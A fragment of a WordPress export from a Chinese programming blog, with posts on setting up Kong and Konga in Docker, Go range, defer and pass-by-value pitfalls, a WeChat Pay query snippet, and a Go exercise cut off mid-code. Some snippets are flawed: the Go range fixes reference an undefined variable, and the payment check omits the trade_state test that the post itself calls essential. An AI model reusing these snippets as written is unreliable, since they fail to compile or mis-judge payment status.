		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_title]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_description]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>开源 API Gateway - Kong 和 Konga 的搭建</title>
		<link>https://www.nervgeek.com/2018/09/25/%e5%bc%80%e6%ba%90-api-gateway-kong-%e5%92%8c-konga-%e7%9a%84%e6%90%ad%e5%bb%ba/</link>
		<pubDate>Tue, 25 Sep 2018 10:06:03 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=2866</guid>
		<description></description>
		<content:encoded><![CDATA[写过好几个项目都是传统的单体项目，刚开始实现 demo 的时候，单体写起来还是很爽很快的，但由于后期功能的增加，代码量的剧增以及逻辑耦合严重，单体应用的缺点暴露无疑，所以最近开始了解微服务，希望运用微服务能解决我目前的困境。

在寻找 API Gateway 的时候，我找到 tyk 和 Kong，最终 Kong 以轻量、搭建方便作为我最终选择（虽然我也没深入对比过他们之间的主要差异，这里有篇性能对比的文章：<a href="https://www.bbva.com/en/api-gateways-kong-vs-tyk/">https://www.bbva.com/en/api-gateways-kong-vs-tyk/</a>）。

<blockquote>Kong 是由 Mashape 公司开源的，基于 Nginx 的 API Gateway，且有鉴权、日志、ip限制限流等插件，所以深得中小型公司的喜爱。</blockquote>

<!--more-->

<h3>1、Quick Start of Kong by Docker</h3>

Docker 版本的搭建基本就是把官网的教程复制过来的，我就大概写一下了（官网教程地址：<a href="https://docs.konghq.com/install/docker/">https://docs.konghq.com/install/docker/</a>）。

创建自定义网络，kong-net 可以替换成任何你喜欢的名称：

<pre>docker network create kong-net</pre>

启动一个数据库，用于记录 Api 和缓存等数据，后期 Kong 的扩展节点也需要连接到同一个数据库，Kong 目前支持两个数据库：Postgres 和 Cassandra。

如果想使用Cassandra容器：

<pre>docker run -d --name kong-database <span class="se">\</span>
              --network<span class="o">=</span>kong-net <span class="se">\</span>
              -p 9042:9042 <span class="se">\</span>
              cassandra:3</pre>

如果想使用PostgreSQL容器：

<pre>docker run -d --name kong-database <span class="se">\</span>
              --network<span class="o">=</span>kong-net <span class="se">\</span>
              -p 5432:5432 <span class="se">\</span>
              -e <span class="s2">"POSTGRES_USER=kong"</span> <span class="se">\</span>
              -e <span class="s2">"POSTGRES_DB=kong"</span> <span class="se">\</span>
              postgres:9.6</pre>

安装完数据库之后，先执行一下初始化数据库的命令：

<pre>docker run --rm <span class="se">\</span>
    --network<span class="o">=</span>kong-net <span class="se">\</span>
    -e <span class="s2">"KONG_DATABASE=postgres"</span> <span class="se">\</span>
    -e <span class="s2">"KONG_PG_HOST=kong-database"</span> <span class="se">\</span>
    -e <span class="s2">"KONG_CASSANDRA_CONTACT_POINTS=kong-database"</span> <span class="se">\</span>
    kong:latest kong migrations up</pre>

都准备好之后就启动 Kong 吧：

<pre>docker run -d --name kong <span class="se">\</span>
    --network<span class="o">=</span>kong-net <span class="se">\</span>
    -e <span class="s2">"KONG_DATABASE=postgres"</span> <span class="se">\</span>
    -e <span class="s2">"KONG_PG_HOST=kong-database"</span> <span class="se">\</span>
    -e <span class="s2">"KONG_CASSANDRA_CONTACT_POINTS=kong-database"</span> <span class="se">\</span>
    -e <span class="s2">"KONG_PROXY_ACCESS_LOG=/dev/stdout"</span> <span class="se">\</span>
    -e <span class="s2">"KONG_ADMIN_ACCESS_LOG=/dev/stdout"</span> <span class="se">\</span>
    -e <span class="s2">"KONG_PROXY_ERROR_LOG=/dev/stderr"</span> <span class="se">\</span>
    -e <span class="s2">"KONG_ADMIN_ERROR_LOG=/dev/stderr"</span> <span class="se">\</span>
    -e <span class="s2">"KONG_ADMIN_LISTEN=0.0.0.0:8001, 0.0.0.0:8444 ssl"</span> <span class="se">\</span>
    -p 8000:8000 <span class="se">\</span>
    -p 8443:8443 <span class="se">\</span>
    -p 8001:8001 <span class="se">\</span>
    -p 8444:8444 <span class="se">\</span>
    kong:latest</pre>

假如顺利执行到这里的话，用

<pre>curl -i http://localhost:8001/</pre>

命令测试一下。没问题的话 Kong 的搭建就到此结束了。但是我们发现，Kong 全部操作都是通过 Api 来完成的，不直观以及不方便管理，所以我们接下来搭建一个 Kong Dashboard。

<h3>2、Quick Start of Konga by Docker</h3>

本来官网推荐的是 kong-dashboard ，但永远跟不上 Kong 的更新速度，在 0.14 的时候，还只支持 0.13，所以我使用了 Konga 。

这个搭建就快了，只需要执行：

<pre>docker run -p 1337:1337 \
             --network {{kong-network}} \ // optional
             --name konga \
             -e "NODE_ENV=production" \ // or "development" | defaults to 'development'
             -e "TOKEN_SECRET={{somerandomstring}}" \
             pantsel/konga</pre>

请记得生成一串随机的字符串来作为 TOKEN_SECRET。创建成功后使用默认的两个账号密码登录。

<strong><em>管理员</em></strong><strong> </strong>登录：admin | 密码：adminadminadmin
<strong><em>演示用户</em></strong> 登录：demo | 密码：demodemodemo

登录之后先进入 connections ，点击 <strong>ACTIVATE</strong> 激活 Kong 环境，然后就可以开始 Api 的配置之旅了。

<img class="alignnone size-full wp-image-2868" src="https://www.nervgeek.com/wp-content/uploads/2018/09/1B_ZR0R3L4JHC14ULV6.png" alt="" width="1581" height="978" />]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2866</wp:post_id>
		<wp:post_date><![CDATA[2018-09-25 18:06:03]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-09-25 10:06:03]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%bc%80%e6%ba%90-api-gateway-kong-%e5%92%8c-konga-%e7%9a%84%e6%90%ad%e5%bb%ba]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="api-gateway"><![CDATA[Api Gateway]]></category>
		<category domain="category" nicename="api%e7%bd%91%e5%85%b3"><![CDATA[Api网关]]></category>
		<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="category" nicename="kong"><![CDATA[Kong]]></category>
		<category domain="category" nicename="konga"><![CDATA[Konga]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_title]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_description]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Golang - for ... range 的一个小细节</title>
		<link>https://www.nervgeek.com/2018/12/10/golang-for-range-%e7%9a%84%e4%b8%80%e4%b8%aa%e5%b0%8f%e7%bb%86%e8%8a%82/</link>
		<pubDate>Mon, 10 Dec 2018 03:41:25 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4035</guid>
		<description></description>
		<content:encoded><![CDATA[昨天晚上看到一道 Go 的基础面试题，看到这道题，觉得还是很容易躺坑，就记录一下吧。

<!--more-->

<pre><code class="language-go ">package main

import "fmt"

type Student struct {
    Name string
    Age int
}

func main() {
    stus := []Student{
        {
            "Lee",
            32,
        },
        {
            "Huang",
            40,
        },
        {
            "Zhao",
            35,
        },
    }
    for k, v := range copyStudent(stus) {
        fmt.Printf("key: %s , value: %v \n", k, v)
    }
}

func copyStudent(stus []Student) map[string]*Student {
    tmp := make(map[string]*Student)
    for _, value := range stus {
        tmp[value.Name] = &amp;value
    }
    return tmp
}
</code></pre>

想要的输出：

<pre><code class="language-shell ">key: Lee , value: &amp;{Lee 32}
key: Huang , value: &amp;{Huang 40}
key: Zhao , value: &amp;{Zhao 35}
</code></pre>

实际的输出：

<pre><code class="language-shell ">key: Lee , value: &amp;{Zhao 35}
key: Huang , value: &amp;{Zhao 35}
key: Zhao , value: &amp;{Zhao 35}
</code></pre>

单从结果来看，我们第一时间会想到，每个 <code>tmp[value.Name]</code> 都指向了同一个 &amp;value，但为什么会这样呢？

原因是 <code>for ... range</code> 中的 <code>value</code> 只是一个值拷贝，每次遍历的值都会赋值给一个变量，相当于：

<pre><code class="language-go ">var value Student
for i := 0;i &lt; len(stus);i++ {
    value = stus[i]
    tmp[value.Name] = &amp;value
}
</code></pre>

所以每次遍历赋予 <code>tmp[value.Name]</code> 的值，只是外部变量 <code>value</code> 的内存地址，并非 <code>stus[i]</code> 的内存地址。

可以输出 <code>value</code> 内存地址来验证一下：

<pre><code class="language-go ">for _, value := range stus {
    fmt.Printf("%p\n",unsafe.Pointer(&amp;value))
    tmp[value.Name] = &amp;value
}
</code></pre>

内存地址输出：

<pre><code class="language-shell ">0xc000052400
0xc000052400
0xc000052400
</code></pre>

知道原因之后，通过避免使用 <code>value</code>，可以改成使用索引来获取：

<pre><code class="language-go ">for i := 0;i &lt; len(stus);i++ {
    tmp[value.Name] = &amp;stus[i]
}
</code></pre>

or

<pre><code class="language-go ">for i, _ := range stus {
    tmp[value.Name] = &amp;stus[i]
}
</code></pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4035</wp:post_id>
		<wp:post_date><![CDATA[2018-12-10 11:41:25]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-12-10 03:41:25]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[golang-for-range-%e7%9a%84%e4%b8%80%e4%b8%aa%e5%b0%8f%e7%bb%86%e8%8a%82]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="golang"><![CDATA[Golang]]></category>
		<category domain="post_tag" nicename="golang"><![CDATA[Golang]]></category>
		<category domain="post_tag" nicename="range"><![CDATA[range]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Golang - 牢记 defer 三个特性</title>
		<link>https://www.nervgeek.com/2018/12/10/golang-%e7%89%a2%e8%ae%b0-defer-%e4%b8%89%e4%b8%aa%e7%89%b9%e6%80%a7/</link>
		<pubDate>Mon, 10 Dec 2018 14:18:15 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4039</guid>
		<description></description>
		<content:encoded><![CDATA[光读书是记不牢的，必须要上手多写累积经验，多点刷题写写笔记，才记得住。
这不，我刚开始看 Go 的面试题，做到关于 <code>defer</code> 的输出的时候，就基本蒙了。

<!--more-->

实际上是一个很基本的面试题：

<pre><code class="language-go ">package main

import (
    "fmt"
    "time"
)
func calc(index string, a, b int) int {
    ret := a + b
    fmt.Println(index, a, b, ret)
    return ret
}

func main() {
    a := 1
    b := 2
    defer calc("1", a, calc("10", a, b))
    a = 0
    defer calc("2", a, calc("20", a, b))
    b = 1
    time.Sleep(time.Duration(2)*time.Second)
}
</code></pre>

问，实际输出是什么？

实际输出是：

<pre><code class="language-shell ">10 1 2 3
20 0 2 2
# 等待两秒
2 0 2 2
1 1 3 4
</code></pre>

其实，只要记住三个点，以后使用 <code>defer</code> 就心中有数了。

<strong>1. <code>defer</code> 表达式中变量的值和函数返回的值在 <code>defer</code> 表达式被定义时就已经明确</strong>

在定义 <code>defer calc("1", a, calc("10", a, b))</code> 时，<code>calc</code> 内部的 <code>calc</code> 已被运行，通过 <code>time.Sleep</code> 我们可以更直观看到，内部的 <code>calc</code> 已经被调用，所以第一个 <code>defer</code> 定义之后，相当于。

当执行到 <code>defer calc("2", a, calc("20", a, b))</code> 之前，<code>a</code> 被重新赋值为 <code>0</code>，但 <code>defer</code> 会对其中变量做了一个拷贝，所以 <code>a = 0</code> 并不会影响第一个的 <code>defer</code> 中的 <code>a</code> 变量，所以目前共有两个 <code>defer</code> 待处理：[ <code>defer calc("1", 1, 3）</code>, <code>defer calc("2", 0, 2）</code>]

<strong>2. <code>defer</code> 表达式的调用顺序是按照栈的先进后出(FILO)</strong>

然后两个 <code>defer</code> 定义会被塞进一个栈， 根据栈的 <code>先进后出(FILO)</code> 来顺序执行。

所以你会看到首先输出<code>defer calc("2", 0, 2）</code>再输出<code>defer calc("1", 1, 3）</code>的内容。

<strong>3. <code>defer</code> 表达式中可以修改函数中的命名返回值</strong>

在这道面试题中没有没有展示出这个特性，关于这个特性以及 <code>defer</code> 更多的坑，可以查看一下 <a href="https://tiancaiamao.gitbooks.io/go-internals/content/zh/03.4.html" title="深入解析Go - 3.4 defer关键字">深入解析Go - 3.4 defer关键字</a>。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4039</wp:post_id>
		<wp:post_date><![CDATA[2018-12-10 22:18:15]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-12-10 14:18:15]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[golang-%e7%89%a2%e8%ae%b0-defer-%e4%b8%89%e4%b8%aa%e7%89%b9%e6%80%a7]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="defer"><![CDATA[defer]]></category>
		<category domain="category" nicename="golang"><![CDATA[Golang]]></category>
		<category domain="post_tag" nicename="golang"><![CDATA[Golang]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>微信支付 - 保证接口的幂等性</title>
		<link>https://www.nervgeek.com/2018/10/07/%e5%be%ae%e4%bf%a1%e6%94%af%e4%bb%98-%e5%9b%9e%e8%b0%83%e8%af%b7%e6%b1%82%e5%92%8c%e6%9f%a5%e8%af%a2%e8%ae%a2%e5%8d%95%e5%88%a4%e6%96%ad%e6%94%af%e4%bb%98%e6%88%90%e5%8a%9f%e6%98%af%e6%9c%89/</link>
		<pubDate>Sun, 07 Oct 2018 04:09:50 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4058</guid>
		<description></description>
		<content:encoded><![CDATA[在用户重新发起支付之前，先根据现有微信订单号主动去查询订单信息：

<pre><code class="language-python "># 如果已存在微信订单id，则去查询订单状态
if order_info.wx_pay_id:
    try:
        r = pay.order.query(out_trade_no=order_info.wx_pay_id)
        if r["return_code"] == "SUCCESS" and r["result_code"] == "SUCCESS":
            try:
                order_done(oid=order_info.oid, user=g.user)
                return format_return(data={"toast": "支付成功"})
            # 无此订单
            except NoOrderException:
                sentry.captureException()
                return format_return(code_msg=OrderCodeMessage.NOORDERERROR,
                                     data={"toast": OrderCodeMessage.NOORDERERROR["msg"]})
            except Exception as e:
                sentry.captureException()
                return format_return(code_msg=OrderCodeMessage.ORDERPAYERROR,
                                     data={"toast": OrderCodeMessage.ORDERPAYERROR["msg"]})
        elif r["result_code"] == "FAIL":
            pass
        else:
            pass
    except Exception as e:
        sentry.captureMessage(e)
        pass
</code></pre>

BTW:

微信支付回调是根据 <code>return_code</code> 和 <code>result_code</code> （注意顺序）是否 <code>SUCCESS</code> 来判断支付成功。
而查询订单的话，除了 <code>return_code</code> 和 <code>result_code</code> 之外，最重要是判断 <code>trade_state</code> 是否为 <code>SUCCESS</code> 来判断订单是否支付成功。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4058</wp:post_id>
		<wp:post_date><![CDATA[2018-10-07 12:09:50]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-10-07 04:09:50]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%be%ae%e4%bf%a1%e6%94%af%e4%bb%98-%e5%9b%9e%e8%b0%83%e8%af%b7%e6%b1%82%e5%92%8c%e6%9f%a5%e8%af%a2%e8%ae%a2%e5%8d%95%e5%88%a4%e6%96%ad%e6%94%af%e4%bb%98%e6%88%90%e5%8a%9f%e6%98%af%e6%9c%89]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="python"><![CDATA[Python]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
		<category domain="category" nicename="%e5%be%ae%e4%bf%a1%e6%94%af%e4%bb%98"><![CDATA[微信支付]]></category>
		<category domain="post_tag" nicename="%e5%be%ae%e4%bf%a1%e6%94%af%e4%bb%98"><![CDATA[微信支付]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_old_date]]></wp:meta_key>
		<wp:meta_value><![CDATA[2018-12-11]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Golang - 关于传参是传值还是传引用</title>
		<link>https://www.nervgeek.com/2018/12/13/golang-%e5%85%b3%e4%ba%8e%e4%bc%a0%e5%8f%82%e6%98%af%e4%bc%a0%e5%80%bc%e8%bf%98%e6%98%af%e4%bc%a0%e5%bc%95%e7%94%a8/</link>
		<pubDate>Thu, 13 Dec 2018 08:51:41 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4064</guid>
		<description></description>
		<content:encoded><![CDATA[对于我这种学 Go 没多久的新手缺少实战经验的人来说，翻翻别人博客学习一下别人的总结是避免躺坑最快捷的方式之一，但有些人的博客写的示例代码，会刷新一些基础不太牢固的小白的三观（例如我），例如这个问题：<strong>传参是传值还是传引用</strong>，对指针、传值、传引用的概念不太清晰的话，很容易造成混淆。

令我迷惑的代码就是这段：

<pre><code class="language-go ">package main

import "fmt"

type person struct {
    name   string
    age    byte
    isDead bool
}

func main() {
    p1 := person{name: "zzy", age: 100}
    p2 := person{name: "dj", age: 99}
    p3 := person{name: "px", age: 20}
    people := []person{p1, p2, p3}
    whoIsDead(people)
    for _, p := range people {
        if p.isDead {
            fmt.Println("who is dead?", p.name)
        }
    }
}

func whoIsDead(p []person) {
    for i, _ := range p {
        if p[i].age &lt; 50 {
            p[i].isDead = true
        }
    }
}
</code></pre>

实际输出：

<pre><code class="">who is dead? px
</code></pre>

我一开始想，为什么 <code>whoIsDead</code> 能修改到 <code>[]people</code> 里面的值呢？不是传值的吗？

<hr />

首先，我们先了解一下，什么是 <code>值类型</code> 和 <code>引用类型</code>。

在 Go 语言里面，只有 <code>slice</code> 、 <code>map</code> 、 <code>chan</code> 这三个是引用类型。

例如 <code>map</code> :

<pre><code class="language-go ">func main() {
    goods:=make(map[string]int)
    goods["饼干"]=19

    mp:=&amp;goods

    fmt.Printf("原始map的内存地址：%p\n",mp)
    modify(goods)
    fmt.Println("饼干升价了！价格是:",goods)
}

 func modify(g map[string]int){
     fmt.Printf("函数map的内存地址：%p\n",&amp;g)
     g["饼干"]=20
 }
</code></pre>

实际输出：

<pre><code class="">原始map的内存地址：0xc000080018
函数map的内存地址：0xc000080028
饼干升价了！价格是: map[饼干:20]
</code></pre>

为什么两次的内存地址不一样，却能成功修改呢？通过翻看 <code>map</code> 的源代码，我们发现 <code>makemap</code> 是返回一个 <code>hmap</code> 类型的指针： <code>*hmap</code>。

<pre><code class="language-go ">func makemap(t *maptype, hint int64, h *hmap, bucket unsafe.Pointer) *hmap {
    ...
}
</code></pre>

所以 <code>map === *hmap</code> ，我们传参的时候，其实就是在传递 <code>map</code> 的指针，你可能会问为什么两次的指针都不一样？

所以 <code>goods</code> 是 一个指向 <code>*hamp</code> 的指针，可以通过 <code>fmt.Printf("map的内存地址：%p\n", goods)</code> 查看实际 <code>map</code> 的内存地址；而 <code>mg</code> 存的是 <code>goods</code> 的内存地址。

由理可得第二个 <code>0xc000080028</code> 其实是 <code>modify</code> 函数内的 <code>g</code> 变量的内存地址，并不是 <code>goods</code> 的内存地址。

<code>chan</code> 和 <code>map</code> 一样，<code>makechan</code> 也是返回一个 <code>*hchan</code> 。

但 <code>slice</code> 和上面两个引用类型有稍微的不一样，

<pre><code class="language-go ">list := []int{1,2,3}
modify(list)

func modify(l []int) {
    // ...
}
</code></pre>

<code>fmt.Printf("%p\n", list)</code> 输出的指针，其实是 <code>list</code> 这个 <code>slice结构体</code> 的 <code>Data</code> 字段的内存地址（内部存储数组元素的地址），所以在 <code>modify</code> 函数里面，可以修改 <code>list</code> 内数组的值，不能修改 <code>len</code> 和 <code>cap</code> 。

所以第一个例子能修改成功也是理所当然的。

<strong>最终结论，Go 语言没有传引用，所有传参都是传值！传参传指针也是传值！</strong>传 <code>值类型</code> 的就拷贝值，传 <code>引用类型</code> 的就是拷贝内存地址（'传'字看得我都语义饱和了）。

只不过语法上对 <code>引用类型</code> 隐藏了指针操作，例如 <code>fmt.Printf</code> 就把 <code>slice</code> 特殊处理了。

但通过闭包对外部变量的引用是传引用：

<pre><code class="language-go ">func main() {
    a := new(int)
    fmt.Println(a)
    func() {
        a = nil
    }()
    fmt.Println(a)
}
</code></pre>

实际输出：

<pre><code class="">0xc010000000
&lt;nil&gt;
</code></pre>

关于 <code>slice</code> 、 <code>map</code> 、 <code>chan</code> 的详细解析可以参考：<a href="http://www.flysnow.org/2018/02/24/golang-function-parameters-passed-by-value.html">Go语言参数传递是传值还是传引用</a>

<a href="https://wizardforcel.gitbooks.io/w3school-go/content/23-2.html">Go 语言指向指针的指针</a>、<a href="https://www.cnblogs.com/snowInPluto/p/7477365.html">关于 Go 中 Map 类型和 Slice 类型的传递</a>、<a href="https://my.oschina.net/chai2010/blog/161384">Go语言的传参和传引用</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4064</wp:post_id>
		<wp:post_date><![CDATA[2018-12-13 16:51:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-12-13 08:51:41]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[golang-%e5%85%b3%e4%ba%8e%e4%bc%a0%e5%8f%82%e6%98%af%e4%bc%a0%e5%80%bc%e8%bf%98%e6%98%af%e4%bc%a0%e5%bc%95%e7%94%a8]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="golang"><![CDATA[Golang]]></category>
		<category domain="post_tag" nicename="golang"><![CDATA[Golang]]></category>
		<category domain="post_tag" nicename="%e4%bc%a0%e5%8f%82"><![CDATA[传参]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e9%92%88"><![CDATA[指针]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Golang - 刷题（1）</title>
		<link>https://www.nervgeek.com/2018/12/14/golang-%e5%88%b7%e9%a2%98%ef%bc%881%ef%bc%89/</link>
		<pubDate>Fri, 14 Dec 2018 09:20:28 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4072</guid>
		<description></description>
		<content:encoded><![CDATA[<h4>下面的程序运行后为什么会爆异常。</h4>

原题 <code>Main</code> 里面的 sleep 原本是 <code>time.Sleep(time.Second * 100000000000000)</code> ，不过原因太明显了（constant 100000000000000000000000 overflows time.Duration
），我就改为 <strong>10</strong> 秒。

<pre><code class="language-go ">package main

import (
    "fmt"
    "time"
)

type Project struct{}

func (p *Project) deferError() {
    if err := recover(); err != nil {
        fmt.Println("recover: ", err)
    }
}

func (p *Project) exec(msgchan chan interface{}) {
    for msg := range msgchan {
        m := msg.(int)
        fmt.Println("msg: ", m)
    }
}

func (p *Project) run(msgchan chan interface{}) {
    for {
        defer p.deferError()
        go p.exec(msgchan)
        time.Sleep(time.Second * 2)
    }
}

func (p *Project) Main() {
    a := make(chan interface{}, 100)
    go p.run(a)
    go func() {
        for {
            a &lt;- "1"
            time.Sleep(time.Second)
        }
    }()
    time.Sleep(time.Second * 10)
}

func main() {
    p := new(Project)
    p.Main()
}
</code></pre>

<!--more-->

首先看懂这段代码干什么：<code>Main</code> 创建一个接收 <code>interface{}</code> 类型的 channel <strong>a</strong>，然后启动一个 <code>run</code> 的 goroutine，<code>run</code> 会每隔两秒创建一个 <code>exec</code> 的 goroutine 来消费这个 <strong>a</strong> channel 并 defer 一个 recover 来捕捉错误。

会发生什么呢？自己做题又不是不让上机，先跑一遍再说（

实际输出：

<pre><code class="">C:\Users\mr9es\go\src\GinLearn\routers&gt;go run main.go
panic: interface conversion: interface {} is string, not int

goroutine 4 [running]:
main.(*Project).exec(0x5761c8, 0xc000092000)
        C:/Users/mr9es/go/src/GinLearn/routers/main.go:18 +0x103
created by main.(*Project).run
        C:/Users/mr9es/go/src/GinLearn/routers/main.go:26 +0x56
exit status 2
</code></pre>

一看，第十八行触发的错误，原因是第十八行做了一个类型检查 <code>m := msg.(int)</code> ，因为传入 channel 一直都是字符串 <code>"1"</code>，没有判断类型是否正常，所以导致 <code>panic</code> 。而且 <code>defer p.deferError()</code> 放在了 <code>run</code> 里面，导致没有捕捉到 <code>exec</code> 内部的错误，而且把 defer 放在了循环内部（Goland 提示 possible resource leak 'defer' is called in a for loop），只要这个 for 不完成，defer 一直都执行不了。

我自己的修改版：

<pre><code class="language-go ">package main

import (
    "fmt"
    "time"
)

type Project struct{}

func (p *Project) deferError() {
    if err := recover(); err != nil {
        fmt.Println("recover: ", err)
    }
}

func (p *Project) exec(msgchan chan interface{}) {
    for msg := range msgchan {
